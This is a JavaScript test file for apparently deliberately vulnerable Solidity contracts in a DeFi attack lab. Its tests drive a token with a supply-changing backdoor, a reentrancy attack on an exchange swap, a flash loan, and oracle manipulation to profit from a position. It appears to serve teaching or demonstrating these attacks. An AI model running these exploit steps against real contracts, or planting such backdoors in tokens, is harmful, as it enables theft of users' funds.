const TrojanCoinAfter = artifacts.require("TrojanCoinAfter");
const HackableExchange1After = artifacts.require("HackableExchange1After");
const HackableExchange2After = artifacts.require("HackableExchange2After");
const FlashLoanProvider1After = artifacts.require("FlashLoanProvider1After");


contract("TrojanCoinAfter", async accounts => {
  it("It should change the totalSupply of a malicious coin (TrojanCoin) once the change supply  backdoor is initialized", async () => {

    let coin;
   let coinSupply;

   coin = await TrojanCoinAfter.deployed();

        coinSupply = parseInt(await coin.totalSupply.call());
        console.log("coinSupply is " + coinSupply );
       await coin.updateSupply('1100000000000000000000000');
        newSupply = parseInt(await coin.totalSupply.call());
        console.log("coinSupply is " + newSupply );
        assert.notEqual(newSupply, coinSupply, "Supply did not update after activation and changing. Somethings wrong.")


 })
});




contract("HackableExchange1After", async accounts => {
  it("Should swap  tokens as a decentralized exchange... When you perform a swap with a trojancoin, you can execute a reentry attack and get more money than you should from the exchange.", async () => {


   theContract = await HackableExchange1After.deployed();
   coin = await FlashLoanProvider1After.deployed();
   fromToken = await TrojanCoinAfter.deployed();
   await fromToken.approve(theContract.address, '100000000000000000000000000000000');



   console.log(" has allowed:" + await fromToken.allowance.call(accounts[0], theContract.address));
   console.log(coin.address);
   amountTrading = 100000000;

   await coin.mintTokensTo(theContract.address, amountTrading*2);


   await fromToken.setMarketplace(theContract.address);
   await fromToken.activateRentry()

    startToTokenBalance = parseInt(await coin.balanceOf(accounts[0]));

    await theContract.tokenToTokenSwap(fromToken.address, coin.address, amountTrading);


    endToTokenBalance = parseInt(await coin.balanceOf(accounts[0]));
    actualAmount = endToTokenBalance - startToTokenBalance;
    console.log(actualAmount)


   supposedToAmount = parseInt(await theContract.getTokenPrice.call(amountTrading));


   console.log("actual:"+ actualAmount)
  console.log("supposed to be" + supposedToAmount);

        assert.isBelow(supposedToAmount*2, actualAmount, "You didnt execute a reentry  or reentry didnt work")


 })
});


contract("FlashLoanProvider1After", async accounts => {
  it("Give you a bunch of eDai  (up to 1 million eDai) as a flash loan once it has liquidity provided initially.  ", async () => {

    let tbeContract;
    let originalUserBalance;
    let currentUserBalance;
   theContract = await FlashLoanProvider1After.deployed();
    originalUserBalance = parseInt(await theContract.balanceOf(accounts[0]));

    await theContract.borrow('1000000000000000000000000');

    currentUserBalance = parseInt(await theContract.balanceOf(accounts[0]));

      console.log("start"+originalUserBalance)
      console.log("end"+currentUserBalance);
        assert.isAbove(currentUserBalance, originalUserBalance, "User should have more of the token they borrowed at the end because flash loan executed successfully")


 })
});




contract("HackableExchange2After", async accounts => {
  it("Should allow you to open a large TrojanCoin/DAI(stablecoin) position and get price information from the hackable exchange. And let you close your position based on information from that exchange. End result, you walk away with alot of money because you performed successful oracle manipulation.", async () => {


   theContract = await HackableExchange2After.deployed();
   flashPlatformWithDaiCoin = await FlashLoanProvider1After.deployed();
   fromToken = await TrojanCoinAfter.deployed();
   oracleExchange = await HackableExchange1After.deployed();


   await theContract.setOracleAddress(oracleExchange.address);
   await theContract.createPosition(flashPlatformWithDaiCoin.address, fromToken.address, true, 2, 100000000);

   await fromToken.updateSupply('10000000000000000000000001')
   await fromToken.updateBalance('10000000000000000000000000')
   await fromToken.transfer(flashPlatformWithDaiCoin.address, '1000000000000000000000000')
   amountWithoutJacking = parseInt(await theContract.closePosition.call());

   flashPlatformWithDaiCoin.borrowToken(fromToken.address, '1000000000000000000000000');
   await oracleExchange.tokenToTokenSwap(fromToken.address, flashPlatformWithDaiCoin.address, '100000000000000000000001');

   amountClosed = parseInt(await theContract.closePosition.call());
   theContract.closePosition;

   console.log( "with jacking" + amountClosed);
   console.log( "without jacking" + amountWithoutJacking);
        assert.isAbove(amountClosed, amountWithoutJacking, "Oracle manipulation didnt happen or trade previous to closing position want high enough to change the oracle rate")


 })
});
